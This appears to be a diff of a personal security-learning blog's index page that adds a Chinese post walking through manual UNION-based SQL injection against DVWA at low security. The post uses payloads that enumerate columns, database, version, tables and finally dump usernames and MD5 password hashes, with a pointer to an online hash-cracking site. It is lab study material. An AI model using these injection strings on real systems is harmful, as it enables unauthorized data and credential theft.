@@ -64,6 +64,43 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQLlow等级手工注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2020-08-28T14:30:18.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">SQLlow等级手工注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.登录DVWA，设置安全等级为LOW<br>2.输入1’order by 2#,有数据内容出现，输入1’order by 3#,没有数据内容显示，说明数据列只有2列<br>3.输入1’union select database(),user()#,查询数据库的名字，用户名<br>4.输入1’union select version(),@@version_compile_os#’,获取数据库版本和当前操作系统<br>5.输入1’union select table_name,table_schema from information_schema.tables where table_schema= ’dvwa’#,获取数据表的名称，注意’dvwa’前面有空格<br>6.输入1’union select user,password from users#,尝试获得用户名和密码<br>7.密码采用md5进行加密，到<a target="_blank" rel="noopener" href="http://www.cmd5.com进行解密/">www.cmd5.com进行解密</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckrsvrhx90005u0vjdqug0n9y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
@@ -91,7 +128,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckrnjds7i00044wvjgad36yhv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckrsvrhx80004u0vj8fm35wda" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +196,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckrnjds7g00024wvj2l1fdy0v" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckrsvrhx50003u0vjhoytgi59" class="article-share-link">Share</a>
       
       
     </footer>
@@ -196,7 +233,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckrnjds7h00034wvj2vr318gy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckrsvrhwx0000u0vj9r4abfdj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -245,7 +282,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckrnjds7j00054wvj837f08nz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckrsvrhxb0008u0vjduq964x9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -278,7 +315,7 @@ default:
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
     </div>
   </div>
 
@@ -289,6 +326,10 @@ default:
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
+          </li>
         
           <li>
             <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
@@ -304,10 +345,6 @@ default:
         
           <li>
             <a href="/2021/07/20/MSF-meterpreter/">MSF--meterpreter</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
           </li>
         
       </ul>
